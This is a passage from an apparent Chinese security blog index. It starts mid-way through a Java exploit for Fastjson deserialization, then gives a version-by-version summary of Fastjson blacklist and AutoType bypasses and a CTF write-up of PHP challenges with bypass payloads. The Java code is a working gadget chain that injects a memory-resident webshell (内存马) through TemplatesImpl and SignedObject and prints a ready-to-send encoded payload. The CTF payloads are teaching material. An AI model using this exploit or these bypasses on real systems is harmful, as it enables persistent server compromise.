com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import org.apache.commons.io.IOUtils; import org.apache.commons.codec.binary.Base64; import ysoserial.payloads.util.Reflections; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.Signature; import java.security.SignedObject; import java.util.ArrayList; import static ysoserial.Serializer.serialize; public class FJ5 { public static void setValue(Object obj, String name, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception{ List\u0026lt;Object\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); //将内存马转化为恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(ysoserial.TestInterceptor.class.getName()); clazz.getClassFile().setMajorVersion(52); byte[] code = clazz.toBytecode(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;1\u0026#34;); setValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测 list.add(templates); JSONArray jsonArray2 = new JSONArray(); //此时在handles这个hash表中查到了映射，后续则会以引用形式输出 jsonArray2.add(templates); BadAttributeValueExpException bd2 = new BadAttributeValueExpException(null); Reflections.setFieldValue(bd2,\u0026#34;val\u0026#34;,jsonArray2); list.add(bd2); //二次反序列化 KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject((Serializable) list, kp.getPrivate(), Signature.getInstance(\u0026#34;DSA\u0026#34;)); //触发SignedObject#getObject JSONArray jsonArray1 = new JSONArray(); jsonArray1.add(signedObject); BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null); Reflections.setFieldValue(bd1,\u0026#34;val\u0026#34;,jsonArray1); //输出 byte[] payload = serialize(bd1); System.out.println(URLEncoder.encode(Base64.encodeBase64String(payload))); } } 成功注入\n参考资料 [1] https://xz.aliyun.com/t/12606\n[2] https://xz.aliyun.com/t/12085\n[3] https://www.javasec.org/java-vuls/FastJson.html\n[4] https://www.cnblogs.com/zpchcbd/p/15545773.html\n[5] https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/\n[6] https://www.freebuf.com/articles/web/365636.html\n","date":"2023-07-09T00:00:00Z","permalink":"https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Btemplatesimpl%E6%B3%A8%E5%85%A5fastjson%E5%86%85%E5%AD%98%E9%A9%AC/","title":"JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马"},{"content":"源自面试的Java拷打，各位可以早做准备：\n“有没调过Java的漏洞\u0026quot;\n\u0026ldquo;Jdk不同版本如何绕过\u0026rdquo;\n“说说Java在版本迭代过程中漏洞攻击面的变化\u0026quot;\n\u0026ldquo;当你拿到一份java代码，你会如何审计\u0026rdquo;\n“说说各个版本的fastjson漏洞\u0026quot;\n\u0026hellip;\u0026hellip;\n概述 fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用。\nfastjson一些要点 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)两者调用链一致，前者通过解析 jsonString 字符串获取 @type 指定的类，后者则会直接使用参数中的Target.class。 而JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。区别在于其在最后执行了一次JSON.toJSON。 fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。 如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。(TemplatesImpl利用链中无setter方法的私有变量_tfactory以及_name赋值及用到这个知识点) fastjson版本更迭的漏洞利用分析 1.2.24(首个漏洞)\u0026ndash;\u0026gt;1.2.41(黑名单绕过)\u0026ndash;\u0026gt;1.2.42(黑名单绕过)\u0026ndash;\u0026gt;1.2.45(新利用链)\u0026ndash;\u0026gt;1.2.47(AutoType绕过)\u0026ndash;\u0026gt;1.2.68(AutoType绕过)\n1.2.24(首个漏洞) Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时没有进行合理检查。\n1.2.41(黑名单绕过) 引入了checkAutotype安全机制\n是否是白名单中的类 是否在反序列化cache中(在mappings列表) 类有JSONType注解(如:fastjson.annotation.JSONType) 如果在恶意类前后加上\u0026quot;L\u0026quot;与\u0026quot;;\u0026quot;，例如\u0026quot;LAutoTypeTest.ForTest;\u0026quot;，这样不仅可以轻易的躲避黑名单，随后在程序执行到这里时，还会将首尾附加的\u0026quot;L\u0026quot;与\u0026quot;;\u0026ldquo;剥去。剥皮处理之后字符串变成\u0026quot;AutoTypeTest.ForTest\u0026rdquo;，接着\u0026quot;AutoTypeTest.ForTest\u0026quot;被loadClass加载，恶意类被成功反序列化利用。\n1.2.42(黑名单绕过) 程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。通过分析其代码发现第一个if分支用来限制传入的类名长度的，只要传入的poc中类名长度在3与128之间即可绕过。而第二个分支，会去掉首尾\u0026quot;L\u0026quot;与\u0026quot;;\u0026ldquo;再放入原来的黑名单逻辑进行判断，我们进行双写即可绕过。\n总结一下：指定长度，双写绕过。\n1.2.45(新利用链) @type指定了JndiDataSourceFactory类，而在properties属性中的data_source变量中指定恶意数据源。由于JndiDataSourceFactory并不在黑名单上，因此可以顺利通过黑名单校验，在接下来的反序列化过程中，在为Properties变量赋值时调用其setter方法。\n1.2.47(AutoType绕过) 可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。\n存在一个逻辑问题：autoTypeSupport 为true时，fastjson 也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。此时我们可以通过将恶意的 val 加载到 mappings 中，再次以恶意类进行 @type 请求时即可绕过黑名单进行的阻拦。\n1.2.68(AutoType绕过) 版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 checkAutoType() 中直接抛出异常，也就是完全禁止 autoType。不过在 checkAutoType() 函数中有这样的逻辑：如果函数有 expectClass 入参，且我们传入的类名是 expectClass 的子类或实现，并且不在黑名单中，就可以通过 checkAutoType() 的安全检测。\n本章简单地归纳对各个版本的fastjson漏洞原理，应付一下面试，之后会进一步对其复现和代码调试分析。\n参考资料 [1]https://www.javasec.org/java-vuls/FastJson.html\n[2]https://paper.seebug.org/1274/\n[3]https://paper.seebug.org/1319/\n[4]https://paper.seebug.org/1343/\n","date":"2023-07-01T00:00:00Z","permalink":"https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/","title":"JAVA入门到放弃系列之Fastjson反序列化(一)"},{"content":"MIDDLE_MAGIC 考察点：\nphp tricks:%0a换行绕过正则，sha1()数组绕过， json绕过;\n\u0026lt;?php highlight_file(__FILE__); include \u0026#34;./flag.php\u0026#34;; include \u0026#34;./result.php\u0026#34;; if(isset($_GET[\u0026#39;aaa\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;aaa\u0026#39;]) \u0026lt; 20){ $aaa = preg_replace(\u0026#39;/^(.*)level(.*)$/\u0026#39;, \u0026#39;${1}\u0026lt;!-- filtered --\u0026gt;${2}\u0026#39;, $_GET[\u0026#39;aaa\u0026#39;]); if(preg_match(\u0026#39;/pass_the_level_1#/\u0026#39;, $aaa)){ echo \u0026#34;here is level 2\u0026#34;; if (isset($_POST[\u0026#39;admin\u0026#39;]) and isset($_POST[\u0026#39;root_pwd\u0026#39;])) { if ($_POST[\u0026#39;admin\u0026#39;] == $_POST[\u0026#39;root_pwd\u0026#39;]) echo \u0026#39;\u0026lt;p\u0026gt;The level 2 can not pass!\u0026lt;/p\u0026gt;\u0026#39;; // START FORM PROCESSING else if (sha1($_POST[\u0026#39;admin\u0026#39;]) === sha1($_POST[\u0026#39;root_pwd\u0026#39;])){ echo \u0026#34;here is level 3,do you kown how to overcome it?\u0026#34;; if (isset($_POST[\u0026#39;level_3\u0026#39;])) { $level_3 = json_decode($_POST[\u0026#39;level_3\u0026#39;]); if ($level_3-\u0026gt;result == $result) { echo \u0026#34;success:\u0026#34;.$flag; } else { echo \u0026#34;you never beat me!\u0026#34;; } } else{ echo \u0026#34;out\u0026#34;; } } else{ die(\u0026#34;no\u0026#34;); } // perform validations on the form data } else{ echo \u0026#39;\u0026lt;p\u0026gt;out!\u0026lt;/p\u0026gt;\u0026#39;; } } else{ echo \u0026#39;nonono!\u0026#39;; } echo \u0026#39;\u0026lt;hr\u0026gt;\u0026#39;; } ?\u0026gt; payload:\nGET ?aaa=%0apass_the_level_1%23 //过level1 POST admin[]=1\u0026amp;root_pwd[]=2 //过level2 admin[]=1\u0026amp;root_pwd[]=2\u0026amp;level_3={\u0026#34;result\u0026#34;:0} //过level3 EASYPY 考察点：\nbasename()函数，$_SERVER[\u0026lsquo;REQUEST_URI\u0026rsquo;]正则匹配绕过；\n\u0026lt;?php include \u0026#39;utils.php\u0026#39;; if (isset($_POST[\u0026#39;guess\u0026#39;])) { $guess = (string) $_POST[\u0026#39;guess\u0026#39;]; if ($guess === $secret) { $message = \u0026#39;Congratulations! The flag is: \u0026#39; . $flag; } else { $message = \u0026#39;Wrong. Try Again\u0026#39;; } } if (preg_match(\u0026#39;/utils\\.php\\/*$/i\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;])) { exit(\u0026#34;hacker :)\u0026#34;); } if (preg_match(\u0026#39;/show_source/\u0026#39;, $_SERVER[\u0026#39;REQUEST_URI\u0026#39;])){ exit(\u0026#34;hackersss :)\u0026#34;); } if (isset($_GET[\u0026#39;show_source\u0026#39;])) { highlight_file(basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;])); exit(); }else{ show_source(__FILE__); } ?\u0026gt; 对于if ($guess === $secret)没有明显的利用点来绕过，$flag大概率就在utils.php文件中；\nif (isset($_POST[\u0026#39;guess\u0026#39;])) { $guess = (string) $_POST[\u0026#39;guess\u0026#39;]; if ($guess === $secret) { $message = \u0026#39;Congratulations! The flag is: \u0026#39; . $flag; } else { $message = \u0026#39;Wrong. Try Again\u0026#39;; } } 往下看，通过highlight_file结合basename可以读到我们想要的utils.php；\nif (isset($_GET[\u0026#39;show_source\u0026#39;])) { highlight_file(basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;])); exit(); } 不过有两层过滤；\nif (preg_match(\u0026#39;/utils\\.php\\/*$/i\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;])) { exit(\u0026#34;hacker :)\u0026#34;); } if (preg_match(\u0026#39;/show_source/\u0026#39;, $_SERVER[\u0026#39;REQUEST_URI\u0026#39;])){ exit(\u0026#34;hackersss :)\u0026#34;); } 第一层的preg_match会检查$_SERVER['PHP_SELF']是否以utils.php/结尾，这里可以利用basename()的一个trick:\nhttps://bugs.php.net/bug.php?id=62119\nbasename()会自动去掉文件名开头的非ascii字符，经测试%81\u0026ndash;%ff都可以达到这个效果，包括中文字符；\npayload:\n/index.php/utils.php/%ff?show_source 测试如下:\n\u0026lt;?php //index.php/%ffutils.php/%ff? echo \u0026#34;_SERVER[\u0026#39;PHP_SELF\u0026#39;]:\u0026lt;br\u0026gt;\u0026#34;; echo $_SERVER[\u0026#39;PHP_SELF\u0026#39;]; //==\u0026gt;/index.php/�utils.php/� echo \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#34;_SERVER[\u0026#39;REQUEST_URI\u0026#39;]:\u0026lt;br\u0026gt;\u0026#34;; echo $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; //==\u0026gt;/index.php/%ffutils.php/%ff?show_source echo \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#34;basename(_SERVER[\u0026#39;PHP_SELF\u0026#39;]):\u0026lt;br\u0026gt;\u0026#34;; echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); //==\u0026gt;utils.php ?\u0026gt; 第二层的preg_match直接URL编码绕过；\n最终payload:\n/index.php/utils.php/%ff?show_%73ource ","date":"2021-03-11T00:00:00Z","permalink":"https://Kleinor.github.io/p/2021%E5%B9%B4%E9%B9%A4%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86web-wp/","title":"2021年鹤城杯部分Web wp"}]